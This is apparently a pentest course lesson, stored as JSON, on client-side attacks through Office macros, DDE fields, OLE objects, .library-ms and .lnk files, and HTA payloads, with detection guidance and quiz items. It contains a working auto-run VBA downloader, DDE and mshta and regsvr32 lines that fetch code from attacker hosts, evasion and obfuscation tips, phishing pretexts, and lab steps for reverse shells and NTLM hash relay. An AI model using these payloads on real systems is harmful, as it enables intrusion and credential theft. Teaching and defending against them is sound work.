{
  "lesson_id": "7b5717ce-f3f2-43c9-a8c9-e5129e50adf5",
  "domain": "pentest",
  "title": "Client-Side Attacks: Microsoft Office & Windows Library Files",
  "difficulty": 2,
  "order_index": 19,
  "prerequisites": [],
  "concepts": [
    "Malicious Office macros (VBA)",
    "DDE and DDEAUTO exploitation",
    "OLE objects and embedded files",
    "Windows Library Files (.library-ms)",
    "Shortcut file (.lnk) attacks",
    "HTML Application (HTA) payloads",
    "Social engineering integration",
    "Delivery methods (email, USB, file shares)",
    "Detection and mitigation"
  ],
  "estimated_time": 55,
  "learning_objectives": [
    "Design persuasive pretexts that map to specific client-side payload formats",
    "Craft and obfuscate VBA and XLM macros that deliver staged payloads",
    "Abuse DDE and OLE features to trigger command execution without traditional macros",
    "Construct .library-ms and .lnk files that capture credentials or execute remote commands",
    "Evaluate detection responses and propose mitigations for client-side attack vectors"
  ],
  "jim_kwik_principles": [
    "active_learning",
    "teach_like_im_10",
    "memory_hooks",
    "connect_to_what_i_know",
    "minimum_effective_dose",
    "meta_learning",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "block_id": "4f2aa528-5387-4dd8-ab34-6ab2294007c1",
      "type": "mindset_coach",
      "content": {
        "text": "You are about to step into the arena where modern client-side attacks live and breathe. Think of this as the intersection of\nuser trust, operating system design decisions, and relentless adversarial creativity. Before we touch any code or craft a single\npayload, adjust your mindset: you are a professional who must understand how attackers weaponize the files that office workers open\nevery day. Curiosity is your power-up, but discipline is your guardrail.\n\nStart by reminding yourself why defenders care about this discipline so much. Reports from Microsoft and Mandiant show that more\nthan 70% of successful intrusion sets in the last three years started with a malicious file delivered through email or cloud file\nsharing. Finance teams are tricked with urgent invoices, legal teams receive “updated contracts,” and system administrators are\nbaited with change management spreadsheets. Every attachment is a potential beachhead. Your role as a penetration tester is to\nsimulate these moves so clients can harden their controls before a real adversary arrives.\n\nAdopt the following mental models as we work:\n\n1. **Human decisions are part of the attack surface.** Phishing-aware employees may still fall for plausible requests. Crafting the\nsocial engineering narrative is just as critical as building the macro payload. Ask yourself: what persona would your target trust?\nWhat workflow are you imitating? Treat the pretext with the same care you give to shellcode.\n\n2. **Default application behaviors are living persistence mechanisms.** Word and Excel trust macros signed by familiar certificates.\nPowerPoint loves embedded OLE objects. Windows Explorer is eager to render icons for shortcut files. Recognize how these defaults\nbecome exploit primitives, not because Microsoft wanted to create vulnerabilities, but because usability demanded it. Respect the\nengineering trade-offs as you probe them.\n\n3. **Blend, don’t brag.** The best client-side testers are almost boring. Their payloads execute quietly, imitate system processes,\nand phone home with minimal noise. Every time you feel tempted to add a dramatic message box or obvious download, pause and ask,\n“How would an actual intruder stay invisible here?” Practicing restraint will improve your credibility and protect your client.\n\n4. **Document everything.** Client-side engagements often involve multiple iterations: initial phishing campaign, payload tuning,\ndefender validation, re-phish simulation. Keep a lab journal. Note which macro security settings were enabled, how AMSI reacted,\nand what EDR telemetry was produced. Your final report is as valuable as your payloads.\n\n5. **Remember the ethics clause.** These techniques can create panic or reputational damage if mishandled. Never deliver a payload\noutside the agreed scope. Never retain sensitive data longer than required. Never cross jurisdictions without legal approval. The\npoint is to educate and harden, not humiliate or exploit.\n\nAs you move through this lesson, picture a penetration test with a large enterprise finance department. They process invoices\nthrough Excel, share documents through OneDrive, and rely on a Windows file server filled with library files and shortcuts. Your\nobjective: obtain an internal foothold via a user action that looks completely normal. With the mindset above, you are ready to\nstudy each vector carefully, mimic real-world threat actors like APT29, FIN7, and TA505, and ultimately produce professional-grade\npayloads that you can defend in a client debrief.\n\nYou can do this. Stay curious, respect the ethical guardrails, and treat every document as a narrative weapon disguised as an\ninnocent file. That’s how you become the tester defenders want on their side."
      }
    },
    {
      "block_id": "64885676-9085-4856-86eb-64340ba23dfa",
      "type": "explanation",
      "content": {
        "text": "## Mapping the Client-Side Attack Surface\n\nClient-side exploitation is about chaining user actions, application behaviors, and payload delivery in a believable story. Let’s\nmap the terrain across four layers: **pretext**, **file type**, **execution technique**, and **post-exploitation objective**.\n\n### 1. Pretext Engineering\n\nEvery malicious file requires a delivery story. Internal penetration tests often use:\n\n- **Operational urgency** – An email claiming, “Finance needs this revised purchase order signed in the next 15 minutes.” Use real\nproject names harvested from OSINT or internal recon.\n- **Policy updates** – HR-themed macros (“New remote-work travel policy”) remain effective, especially during mergers or compliance\nshifts.\n- **Shared resource prompts** – “Someone added you to a Windows library for Q4 forecasts. Please open the attached .library-ms file.”\n\nCrafting the narrative is not optional; it informs the file format you will weaponize. A .lnk file disguised as a shared network\nshortcut pairs perfectly with a request to access a procurement share.\n\n### 2. Weaponized File Types\n\nWe focus on three families in this lesson:\n\n1. **Office Macro Documents (VBA & XLM)** – Word (.docm), Excel (.xlsm), and PowerPoint (.pptm) support embedded Visual Basic for\nApplications. Macros can auto-execute through `AutoOpen`, `Workbook_Open`, or ribbon callbacks. Legacy XLM macros are still\nsupported for compatibility and can be abused to evade macro scanning engines.\n\n2. **Windows Library Files (.library-ms) and Shortcuts (.lnk)** – Libraries aggregate folders. The `.library-ms` format is XML that\nreferences folder paths, icons, and metadata. Attackers embed remote SMB paths like `\\\\attacker\\\\share` to coerce authentication\nand deliver payloads. Shortcut files can execute arbitrary commands in the `Target` field, commonly abusing `powershell.exe -w\nhidden -EncodedCommand ...` or `cmd.exe /c start \\\\attacker\\\\share\\\\payload.hta`.\n\n3. **HTML Application Files (HTA) and OLE-Embedded Objects** – HTAs run with full trust via `mshta.exe`. An Office document can\ncontain an OLE object (e.g., a packaged executable) that drops and runs on double-click. Combined with enticing instructions (“Click\nthe embedded invoice viewer to enable macros”), you can trigger code execution even if macros are disabled.\n\n### 3. Execution Techniques and Evasion Considerations\n\n- **Macro Security Bypass** – Encourage users to click “Enable Content” by embedding instructions and fake Microsoft notifications.\nUse `Application.AutomationSecurity = msoAutomationSecurityLow` to run macros with minimal prompts once trust is granted. Embed\nstaged payloads using `CertUtil`, `Invoke-WebRequest`, or COM object abuse (e.g., `WScript.Shell`).\n\n- **DDE/DDEAUTO Abuse** – Dynamic Data Exchange fields can be placed in Word or Excel to run commands without macros. Example field:\n`{ DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k powershell.exe -nop -w hidden -c Invoke-WebRequest http://x.x.x.x/p.ps1 -OutFile %TEMP%\\\\u.ps1\" }`.\nModern Office versions warn users, but persuasive social engineering can convince them to accept.\n\n- **Library File Triggered SMB Auth Leak** – When a victim opens a `.library-ms` referencing `\\\\attacker\\\\documents`, Windows tries to\ndisplay the folder icon, initiating an NTLM authentication attempt. Capture hashes with Responder or relay them to Kerberos-aware\nservices. Combine with WebDAV or DFS shares to host malicious content.\n\n- **Shortcut File Execution** – `.lnk` files can chain commands: `powershell.exe -ExecutionPolicy Bypass -File \\\\attacker\\\\share\\\\loader.ps1`.\nAttackers embed them within ZIP archives or ISO images that maintain file metadata and avoid Mark-of-the-Web restrictions.\n\n- **HTA Payload Delivery** – Use `mshta http://attacker/payload.hta` to execute script directly in memory. Combine with obfuscated VBScript or\nJScript to download shellcode using WinHTTP COM objects.\n\n### 4. Post-Exploitation Goals\n\nTypical objectives include establishing a reverse shell, stealing credentials, or staging further payloads. For ethical pentesting,\nconsider low-impact proofs such as `whoami`, `hostname`, or listing environment variables. Document each step, note detection logs,\nand prepare remediation guidance like enforcing Protected View, disabling DDE, and hardening SMB.\n\nThe rest of this lesson will dive deeper into macro craft, DDE exploitation, library and shortcut abuse, HTA payload delivery,\nall wrapped in the narrative of a realistic engagement."
      }
    },
    {
      "block_id": "b4a4c1ee-8b42-4744-9e3c-1d7a38419ad3",
      "type": "explanation",
      "content": {
        "text": "## Building Malicious Office Documents\n\n### Crafting a VBA Macro Dropper\n\n1. **Stage Selection** – Decide whether your macro will drop an executable, execute PowerShell, or reflectively load shellcode. For a\nstealthy approach, leverage PowerShell’s `Add-Type` to compile shellcode runners in memory.\n\n2. **Macro Structure** – Use a workbook module with an `Auto_Open` subroutine:\n\n```vba\nPrivate Declare PtrSafe Function CreateProcess Lib \"kernel32\" Alias \"CreateProcessA\" _\n    (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, _\n     ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, _\n     ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As Long, lpStartupInfo As STARTUPINFO, _\n     lpProcessInformation As PROCESS_INFORMATION) As Long\n\nSub Auto_Open()\n    Dim cmd As String\n    cmd = \"powershell.exe -nop -w hidden -c \\\"IEX(New-Object Net.WebClient).DownloadString('https://10.0.5.4/dropper.ps1')\\\"\"\n    Shell cmd, vbHide\nEnd Sub\n```\n\n3. **Obfuscation** – Break strings with `Chr()` calls, base64-encode commands, or use staged macros that read payloads from document\nproperties (`ActiveDocument.BuiltInDocumentProperties`). Combine with `Application.ScreenUpdating = False` to reduce suspicion.\n\n4. **Evasion Tips** –\n   - Sign macros with a self-signed certificate that mimics the client’s domain.\n   - Hide the macro module within `ThisWorkbook` or rename it to plausible names like `modPivotRefresh`.\n   - Leverage Excel 4.0 (XLM) macros stored in hidden sheets. Use `=EXEC(\"powershell -nop -w hidden -EncodedCommand ...\")`.\n\n### DDE and DDEAUTO Fields\n\nDDE is a legacy inter-process communication mechanism. Attackers create fields such as:\n\n```\n{ DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/c powershell.exe -nop -w hidden -EncodedCommand <payload>\" }\n```\n\n- Insert by pressing `Ctrl+F9` in Word, typing the DDE command, and toggling with `Alt+F9`.\n- Modern Office versions display a warning: “This document contains fields that can share data with other files. Do you want to\nupdate this document?” Provide social proof in the document (“Click ‘Yes’ to update the financial summary”).\n- Use DDE for initial execution, then switch to macro-enabled versions if defenders block the technique.\n\n### Embedding OLE Objects\n\n1. Navigate to **Insert > Object > Package**.\n2. Browse to your payload, e.g., `invoice_viewer.hta`.\n3. Customize the icon and label to match legitimate tools (Adobe Reader, Excel).\n4. Add instructions in the document (“Double-click the icon to activate the secure viewer”).\n\nUpon double-clicking, Windows extracts the packaged file to `%TEMP%` and executes it. Combine with environment checks to avoid\nsandbox execution:\n\n```vba\nIf Environ(\"USERNAME\") = \"WDAGUtilityAccount\" Then Exit Sub\n```\n\n### Social Engineering Enhancements\n\n- Insert realistic tables, logos, and disclaimers. Attackers often copy entire corporate templates.\n- Use mail merge to personalize messages (“Hi Maria, here’s the revised statement of work”).\n- Host macros on SharePoint or Teams to create legitimate-looking download flows.\n\n### Quality Assurance Checklist\n\n- Test across Office versions (2013, 2016, 365) because security prompts differ.\n- Validate macro execution with and without internet connectivity.\n- Monitor Defender’s event logs (`Event ID 4104`) to understand script block logging triggered by your commands.\n- Capture network packets to verify whether TLS inspection or proxy authentication could break your payload chain.\n\nBy mastering these techniques, you can emulate campaigns like FIN7’s macro-laced restaurant invoices (2017) or Emotet’s template\nswaps (2020) while remaining within ethical bounds."
      }
    },
    {
      "block_id": "9bd11ac9-6123-44bd-92e8-193e7ee9ad6b",
      "type": "explanation",
      "content": {
        "text": "## Delivery Channels, Evasion Layers, and Defensive Countermeasures\n\n### Delivery Workflows\n\n1. **Email Attachments** – The classic entry point. Pair your payload with SPF/DKIM-aligned sending domains or use client-approved\nsimulated phishing platforms. Track open rates, macro enablement, and telemetry produced in secure mail gateways.\n\n2. **Cloud Shares & Collaboration Suites** – Upload macro-enabled documents to SharePoint, OneDrive, or Google Drive. Many\norganizations implicitly trust files shared by internal accounts. Reuse legitimate project folder structures to avoid suspicion.\n\n3. **Removable Media Drops** – For physical security exercises, load `.lnk` files and HTAs onto branded USB drives. Configure the\nshortcut to reference `\\\\attacker\\\\updates` so that plugging the drive inside the corporate network triggers credential leakage.\nInclude decoy documents to support the narrative.\n\n4. **File Share Seeding** – Place `.library-ms` and `.lnk` files in network shares that target teams regularly browse. Monitor who\nopens them and correlate with Active Directory logs.\n\n### Payload Layering & Evasion\n\n- **Macro + HTA Hybrid** – Use the macro to spawn `mshta.exe` with an obfuscated script that downloads shellcode. This bypasses some\nmacro scanning engines because the heavy lifting happens in the HTA file.\n\n- **LOLBin Utilization** – Execute payloads via trusted binaries such as `rundll32.exe javascript:\"\\\\..\\\\mshtml,RunHTMLApplication\"` or\n`regsvr32.exe /s /n /u /i:http://attacker/payload.sct scrobj.dll`. Library files can point to network shares hosting these scripts.\n\n- **Environmental Awareness** – Implement sandbox detection: check for unrealistic CPU counts, examine running processes for EDR,\nor verify domain membership using `CreateObject(\"WScript.Network\").UserDomain`. If checks fail, gracefully exit and log the event\nfor your engagement notes.\n\n- **Command & Control Throttling** – Configure your payload to delay execution (`Sleep 60000`), perform beacon jitter, and encode\ntraffic with base64 inside HTTP headers to blend with corporate proxies.\n\n### Defensive Mitigations to Highlight in Reports\n\n- **Office Hardening** – Enforce Group Policy settings: disable DDE, block macros from internet-sourced documents, restrict unsigned\nmacros, and leverage Attack Surface Reduction (ASR) rules such as `Block all Office applications from creating child processes`.\n\n- **Network Controls** – Require SMB signing, restrict outbound SMB, and monitor for `mshta.exe`, `powershell.exe`, and `cmd.exe`\nrunning as child processes of Office applications. Deploy Canary tokens on key shares to detect unauthorized access.\n\n- **Endpoint Detection** – Ensure AMSI integration is active and script block logging (4104) is forwarded to SIEM. Configure EDR to\nalert on `.lnk` files launching interpreters and `.library-ms` files referencing external hosts.\n\n- **User Awareness** – Train employees to verify unexpected requests, and implement just-in-time review processes for financial\nchanges. Provide a simple reporting path for suspicious documents so security teams can analyze attachments quickly.\n\n### Reporting Narrative\n\nWhen you present findings, structure the story chronologically:\n\n1. **Initial Access Attempt** – Document the pretext, delivery method, and user interaction required.\n2. **Execution Evidence** – Provide logs, screenshots, and command transcripts showing the payload’s behavior.\n3. **Detection Outcome** – Detail whether controls blocked the attack, triggered alerts, or remained silent.\n4. **Business Impact** – Explain what data or privileges could have been compromised had this been malicious.\n5. **Recommendations** – Map mitigations to the MITRE ATT&CK framework (Initial Access T1566, Execution T1204, Credential Access\nT1557.002).\n\nThis clarity ensures executives understand the risk while defenders know which configurations to adjust."
      }
    },
    {
      "block_id": "368a02cc-a707-4b06-b44c-15ccea44ec7b",
      "type": "explanation",
      "content": {
        "text": "## Detection Engineering and Purple Team Collaboration\n\nClient-side payloads are only half of the story; demonstrating how defenders can detect them is what makes your assessment\ntransformative. Use this checklist to guide collaborative purple team sessions.\n\n### Telemetry Sources to Collect\n\n- **Email Gateway Logs** – Identify subject lines, attachment hashes, and sender infrastructure. Correlate with Microsoft 365\nAdvanced Threat Protection or Proofpoint logs to see which controls flagged your message.\n\n- **Office Application Logging** – Enable `File > Options > Trust Center` diagnostics and registry-based logging for macro events.\nOffice 365 audit logs include `FileAccessed` events showing when a user enabled content.\n\n- **Endpoint Telemetry** – Sysmon events 1 (Process Create), 7 (Image Load), 11 (File Create), 13 (Registry Value Set) are crucial.\nCreate baseline queries that detect `WINWORD.EXE` spawning `powershell.exe` or `mshta.exe` from `%TEMP%`.\n\n- **Network Sensors** – Capture SMB connections to unusual hosts, HTTP requests to unrecognized domains, and DNS queries for random\nsubdomains used by stagers. Deploy Zeek or Suricata to inspect the first few packets of downloads initiated by Office.\n\n### Analytics You Should Propose\n\n- **Macro Child Process Rule** – `ParentImage IN (winword.exe, excel.exe, powerpnt.exe) AND Image IN (powershell.exe, cmd.exe, mshta.exe, rundll32.exe)`.\n- **Library Access Alert** – Detect `.library-ms` files retrieved via email or downloaded from the internet by monitoring Mark-of-the-Web metadata.\n- **SMB Auth Spike** – Alert when a workstation suddenly authenticates to multiple SMB shares in quick succession after opening a\ndocument.\n- **HTA Execution Context** – Flag `mshta.exe` launching from Outlook or Explorer with command-line parameters referencing remote\nHTTP/HTTPS resources.\n\n### Purple Team Workflow\n\n1. **Plan** – Share your payload plan with the detection engineers. Agree on success criteria: e.g., detection within five minutes\nof macro execution.\n2. **Execute** – Run the payload while SOC analysts monitor dashboards. Encourage them to narrate what they see in real time.\n3. **Measure** – Record mean time to detect, mean time to investigate, and any false positives triggered by your simulation.\n4. **Improve** – Adjust detections or payloads iteratively. For example, if defenders catch PowerShell, switch to HTA or compiled\nbinaries to test resilience.\n\n### Communicating Mitigation Steps\n\nWhen you brief stakeholders, connect each finding to actionable controls:\n\n- Recommend enabling Protected View for files originating from the internet and forcing macros to run in sandboxed AppContainers.\n- Suggest requiring SMB signing and disabling NTLMv1 to reduce credential relay risk.\n- Highlight the value of Microsoft Defender Attack Surface Reduction rules, Intune app control policies, and user awareness\ncampaigns tied to real examples from your engagement.\n- Encourage periodic phishing simulations paired with tabletop exercises so leadership understands decision points when alerts\ntrigger.\n\nBy including these defensive insights, you demonstrate that client-side testing is not about embarrassing users—it is about helping\nsecurity teams tighten the seams between human behavior and technical controls. Your credibility increases when you provide both\nthe offensive playbook and the defensive scorecard."
      }
    },
    {
      "block_id": "579bfc2e-993b-45af-b542-987f5031da8d",
      "type": "video",
      "content": {
        "title": "Video: Weaponizing Office Files and Windows Shortcuts",
        "url": "https://www.youtube.com/watch?v=OvYb_1Ee5c4",
        "description": "Walk through macro creation, DDE exploitation, and shortcut payload assembly with this detailed conference demo."
      }
    },
    {
      "block_id": "f928b71b-f805-4dc3-913b-829578574a8d",
      "type": "code_exercise",
      "content": {
        "text": "### Hands-On Lab: Macro & Library Payloads\n\nFollow this guided exercise in your isolated lab. Disable network egress to the public internet and simulate your own attacker\ninfrastructure using Kali Linux and a Windows 11 virtual machine.\n\n1. **Prepare the Lab**\n   - On Kali, configure an SMB share using `impacket-smbserver` to host payloads: `sudo impacket-smbserver docs $(pwd)/share -smb2support`.\n   - Start an HTTPS listener with `socat` or `python3 -m http.server` for payload retrieval.\n   - On Windows, ensure Microsoft Office is installed and macros are set to “Disable with notification.”\n   - Install `OLETools` and `ViperMonkey` on Kali to inspect your own payloads like a blue team would.\n\n2. **Create the Malicious Macro Document**\n   - Build `dropper.ps1` that downloads and executes a staged reverse shell from your SMB share.\n   - Open Excel, insert the VBA macro provided earlier, but modify the command to fetch from `\\\\10.0.5.5\\\\docs\\\\dropper.ps1`.\n   - Save as `Q4_Forecast.xlsm` and add realistic content (charts, pivot tables, cell comments).\n   - Use the Document Inspector to remove metadata, then re-add purposeful comments such as “Model recalculates on open.”\n\n3. **Test Execution & Obfuscation**\n   - Open the document in your Windows VM, enable content, and confirm the payload runs. Capture callbacks with `nc -lvnp 4444` or\n     a Metasploit listener.\n   - Reopen the document with AMSI logging enabled (`Set-MpPreference -EnableIOAVProtection $true`) to observe detection events.\n   - Apply string obfuscation to the macro (split commands, use `ChrW`, random variable names) and retest. Record defender responses.\n   - Export the macro as an XLM sheet and test Excel 4.0 execution. Compare Defender’s response to VBA vs. XLM.\n\n4. **Craft a .library-ms File**\n   - Duplicate Microsoft’s sample library file from `%AppData%\\\\Microsoft\\\\Windows\\\\Libraries`.\n   - Edit the XML to point to your SMB share (`\\\\10.0.5.5\\\\finance`) and update metadata to reflect the client’s finance team.\n   - Host a malicious `invoice.lnk` inside the share that launches `powershell.exe -w hidden -nop -EncodedCommand ...`.\n   - Open the library file in Windows Explorer and confirm NTLMv2 hashes are captured in Kali using Responder.\n   - Relay captured hashes to an internal web server (`ntlmrelayx -tf targets.txt -smb2support`) and document the outcome.\n\n5. **Build an HTA Payload**\n   - Create `loader.hta` that uses VBScript to download an encrypted shellcode blob and execute it with the Windows API.\n   - Serve the HTA through your SMB share and modify the macro to launch it (`Shell \"mshta.exe \\\\10.0.5.5\\\\docs\\\\loader.hta\", vbHide`).\n   - Analyze the behavior in Process Monitor to understand file writes and registry touches.\n\n6. **Combine Social Engineering**\n   - Write a phishing email template referencing a vendor dispute. Attach both the Excel macro and the library file inside a ZIP.\n   - Use PowerShell to add a fake Mark-of-the-Web alternate data stream to simulate internet delivery (`Set-Content -Path file -Stream Zone.Identifier`).\n   - Open the ZIP in Windows to observe Protected View prompts and document the click path required for execution.\n\n7. **Blue Team Simulation**\n   - Run `olevba` and `mshta -embedding` on your payloads to see what defenders would extract.\n   - Generate Sysmon logs (Event IDs 1, 11, 13) and forward them to a local ELK stack. Practice writing Sigma rules to detect your\n     macro and HTA behavior.\n   - Feed the logs into a SOAR playbook to automate containment (disable user account, isolate endpoint) and measure response time.\n\n8. **Debrief & Mitigation Notes**\n   - Identify which controls caught your payloads (Defender SmartScreen, AMSI, macro settings, mail gateway stripping).\n   - Propose mitigations: disabling macros from internet-sourced documents, enabling ASR rules, enforcing SMB signing, blocking WebDAV.\n   - Prepare a short executive summary that links each payload to MITRE ATT&CK techniques.\n   - Reflect on how you would alter the payload to stay undetected if defenders implemented your recommendations.\n\nDeliverables for your portfolio:\n   - Screenshots of macro execution, HTA launching, and captured hashes.\n   - Notes comparing macro vs. library attack effectiveness and detection artifacts.\n   - A table mapping each payload to defensive recommendations and responsible teams.\n   - A sample purple team report summarizing detection gaps and remediation actions."
      }
    },
    {
      "block_id": "a9ae9c3e-7473-43a1-afdb-3c6d25fa25b4",
      "type": "real_world",
      "content": {
        "text": "### Real-World Case Study: APT29’s LNK Campaigns\n\nIn 2020, the Russian threat group APT29 (a.k.a. Cozy Bear) targeted Western governments with spear-phishing emails disguised as\nU.S. State Department updates. Instead of macro documents, they delivered ZIP files containing `.lnk` shortcuts. When victims\ndouble-clicked, the shortcut executed PowerShell to download Cobalt Strike payloads from compromised domains.\n\nKey operational details:\n\n- **Stage Delivery** – The LNK file was accompanied by a benign-looking PDF so that the archive appeared trustworthy.\n- **Execution Flow** – Target field: `C:\\\\Windows\\\\System32\\\\cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand <payload>`.\n- **Evasion** – The PowerShell payload lived in memory, using `Invoke-Expression` with obfuscated strings and multiple download\nfallbacks. Domain fronting disguised network traffic as legitimate cloud services.\n- **Social Engineering** – Emails referenced COVID-19 travel restrictions, aligning with global concerns.\n\nAnother example involves FIN7 (Carbanak), who sent `.docx` files with macros leading to `mshta.exe` execution. Their macros included\nsleep timers and checks for virtualization (e.g., `Win32_ComputerSystemProduct` WMI queries) before running payloads. They combined\nmacro execution with HTML Application downloads to maintain persistence.\n\nIn 2022, TA505 adopted `.library-ms` payloads distributed through ISO images. Once mounted, the image contained enticing shortcut\nfiles pointing to remote shares. Victims double-clicked, leaked credentials, and executed remote DLLs.\n\nUnderstanding these campaigns helps you model realistic assessments. When you design your test, articulate how your macro or\nshortcut mimics these threat actors and what defensive controls (EDR detections, email filters, ASR rules) would disrupt them.\nExplain to stakeholders that these are not hypothetical tactics; they have been observed in the wild against Fortune 100 companies\nand government agencies."
      }
    },
    {
      "block_id": "b34531c2-4c9f-421d-91d5-a260f3519d30",
      "type": "memory_aid",
      "content": {
        "text": "### Memory Hooks: Client-Side Attack Checklist\n\n- **Story First** – Pretext determines file type. No narrative, no click.\n- **Trust Boundary** – Office macros + user consent = execution.\n- **Legacy Power** – DDE, OLE, and library files persist because backward compatibility matters.\n- **Network Insight** – SMB, WebDAV, and HTTP interplay in payload delivery. Capture NTLM, relay Kerberos.\n- **Defense in Depth** – Protected View, ASR rules, AMSI, and application control each disrupt a different stage.\n- **Report Ready** – Always pair exploit steps with mitigation advice.\n- **Validation Mindset** – Reproduce detections, capture logs, and provide artifacts.\n- **Iterate** – Re-run payloads after remediation to verify improvements and maintain institutional memory.\n\nMemorize with the mnemonic **“STL NDRVI”**: **S**tory, **T**rust, **L**egacy, **N**etwork, **D**efense, **R**eport, **V**alidate, **I**terate."
      }
    },
    {
      "block_id": "8c2722f5-3672-450b-8334-0fbe5ac4a4d5",
      "type": "reflection",
      "content": {
        "text": "1. How would you redesign your macro payload if the target organization blocks all outbound PowerShell traffic but allows `mshta.exe`?\n2. Which detection controls did your lab exercise bypass, and how would you explain those gaps to an executive audience?\n3. What ethical guardrails will you emphasize before launching a real client-side assessment?\n4. How could you adapt the `.library-ms` technique for a hybrid workforce that relies heavily on OneDrive and SharePoint syncing?\n5. What communication plan will you follow if a simulated phishing recipient reports your payload mid-exercise?"
      }
    }
  ],
  "post_assessment": [
    {
      "question_id": "01b87dc2-78b6-4e5c-8b5c-f3bd7a16f80e",
      "type": "multiple_choice",
      "difficulty": 2,
      "question": "Which statement best describes the purpose of a .library-ms file in a client-side attack?",
      "options": [
        ".library-ms files execute macros without user interaction and automatically install payloads",
        ".library-ms files can coerce Windows Explorer to connect to attacker-controlled SMB shares, leaking NTLM credentials",
        ".library-ms files allow embedding HTA payloads that run regardless of macro security",
        ".library-ms files are only used for DLL sideloading attacks against Windows services"
      ],
      "correct_answer": ".library-ms files can coerce Windows Explorer to connect to attacker-controlled SMB shares, leaking NTLM credentials",
      "explanation": "A .library-ms file defines a virtual library pointing to folders. If those folders reference attacker SMB shares, opening the file triggers authentication attempts that leak NTLM hashes or load malicious content."
    },
    {
      "question_id": "1bc3a25a-0b6b-4e02-b915-b9bbb699e2be",
      "type": "multiple_choice",
      "difficulty": 2,
      "question": "What is the main advantage of using a DDEAUTO field instead of a traditional VBA macro?",
      "options": [
        "DDEAUTO runs without any security warnings in modern Office versions",
        "DDEAUTO allows code execution even when macros are disabled, though it still prompts the user",
        "DDEAUTO guarantees persistence by installing scheduled tasks automatically",
        "DDEAUTO hides payloads inside embedded PDF objects"
      ],
      "correct_answer": "DDEAUTO allows code execution even when macros are disabled, though it still prompts the user",
      "explanation": "DDEAUTO fields leverage legacy data exchange functionality to run commands. They can execute even if macros are blocked, but the user must approve the action after a warning dialog."
    }
  ]
}